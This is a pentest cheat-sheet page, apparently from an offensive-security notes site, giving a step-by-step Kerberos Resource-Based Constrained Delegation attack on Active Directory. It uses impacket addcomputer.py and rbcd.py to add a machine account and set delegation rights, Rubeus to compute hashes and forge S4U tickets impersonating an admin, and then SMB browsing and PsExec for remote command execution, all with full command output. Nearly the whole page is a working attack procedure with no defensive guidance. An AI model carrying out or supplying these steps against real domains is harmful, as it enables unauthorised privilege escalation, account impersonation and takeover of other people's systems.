---
title : "RBCD-attack"
# pre : ' '
description : "Resource-Based Constrained Delegation Attack (Kerberos RBCD / KRBCD)."
date : 2021-02-17T15:54:06+01:00
# hidden : true
# draft : true
weight : 90
# tags : ['']
---

---

Kerberos Resource-Based Constrained Delegation Attack (Kerberos RBCD / KRBCD). Resource-Based Constrained Delegation - Generic write abuse.

## Installation

```plain
git clone https://github.com/tothi/rbcd-attack
```

### Abusing

### Create the computer object needed for the operation

```plain
$ addcomputer.py -computer-name 'RECEPTION$' -computer-pass JteYeCym2JxkH -dc-ip 10.10.10.10 offsec.nl/jane:'Welkom123!'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account RECEPTION$ with password JteYeCym2JxkH.
```

### Set rights for impersonation

```plain
$ ./rbcd.py -f RECEPTION -t WIN10-TARGET -dc-ip 10.10.10.10 offsec.nl\\jane:'Welkom123!'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against WIN10-TARGET$
[*] Initializing LDAP connection to 10.10.10.10
[*] Using offsec.nl\jane account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `RECEPTION` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `WIN10-TARGET`
[*] Delegation rights modified succesfully!
[*] RECEPTION$ can now impersonate users on WIN10-TARGET$ via S4U2Proxy
```

### Create RC4-HMAC hash for computer object

```plain
Z:\> .\Rubeus.exe hash /password:JteYeCym2JxkH /user:RECEPTION /domain:offsec.nl

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : JteYeCym2JxkH
[*] Input username             : RECEPTION
[*] Input domain               : offsec.nl
[*] Salt                       : offsec.nlRECEPTION
[*]       rc4_hmac             : C3CA46DA95A2B9CAB36C31A3202CE355
[*]       aes128_cts_hmac_sha1 : D9C29470D497E61186549BCC5517E736
[*]       aes256_cts_hmac_sha1 : C4CB81B0428A8384445C981575393BADC6F468396B44D39F166754C5A896FD8A
[*]       des_cbc_md5          : 528F4FE3A219FB6E
```

### Impersonate any user from the Active Directory

```plain
PS z:\> .\rubeus.exe s4u /user:RECEPTION$ /rc4:C3CA46DA95A2B9CAB36C31A3202CE355 /impersonateuser:JOHNDO-ADM /msdsspn:cifs/WIN10-TARGET.offsec.nl /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: S4U

[*] Using rc4_hmac hash: C3CA46DA95A2B9CAB36C31A3202CE355
[*] Building AS-REQ (w/ preauth) for: 'offsec.nl\RECEPTION$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5jCCBO[...REDACTED...]J2aWNlcy5ubA==


[*] Action: S4U

[*] Using domain controller: DC01.offsec.nl (10.10.10.10)
[*] Building S4U2self request for: 'RECEPTION$@offsec.nl'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'JOHNDO-ADM@offsec.nl' to 'RECEPTION$@offsec.nl'
[*] base64(ticket.kirbi):

      doIJHjCCCRqgAwI[...REDACTED...]DAgEBoQgwBhsET0NEJA==

[*] Impersonating user 'JOHNDO-ADM' to target SPN 'cifs/WIN10-TARGET.offsec.nl'
[*] Using domain controller: DC01.offsec.nl (10.10.10.10)
[*] Building S4U2proxy request for service: 'cifs/WIN10-TARGET.offsec.nl'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/WIN10-TARGET.offsec.nl':

      doIKAjCCCf6gAw[...REDACTED...]VJWSUNFUy5OTA==
[+] Ticket successfully imported!
```

### Check ticket is successfully imported

```plain
PS z:\> klist

Current LogonId is 0:0x7b698

Cached Tickets: (1)

#0>     Client: JOHNDO-ADM @ offsec.nl
        Server: cifs/WIN10-TARGET.offsec.nl @ offsec.nl
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40210000 -> forwardable pre_authent name_canonicalize
        Start Time: 2/17/2021 15:12:51 (local)
        End Time:   2/18/2021 1:12:51 (local)
        Renew Time: 0
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

### Browse the system using the ticket

```plain
PS z:\> dir \\WIN10-TARGET.offsec.nl\c$

    Directory: \\WIN10-TARGET.offsec.nl\c$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/27/2018  11:39 AM                Intel
d-----         5/23/2020   8:02 AM                PerfLogs
d-r---         8/19/2020   1:20 PM                Program Files
d-r---         7/10/2020  10:30 AM                Program Files (x86)
da----          2/4/2021   8:11 AM                Temp
d-r---         9/29/2020  10:33 AM                Users
d-----         2/17/2021   2:34 PM                Windows
```

### Run PsExec

```plain
PS z:\> PsExec.exe \\WIN10-TARGET.offsec.nl cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.18363.1316]
(c) 2019 Microsoft Corporation. All rights reserved.
C:\WINDOWS\system32>whoami
offsec.nl\JOHNDO-ADM
```

## URL List

- [iRED.team - Kerberos Resource-based Constrained Delegation: Computer Object Take Over](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [Github.com - Abusing Kerberos Resource-Based Constrained Delegation](https://github.com/tothi/rbcd-attack)
- [harmj0y.net - A case study in wagging the dog computer takeover](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
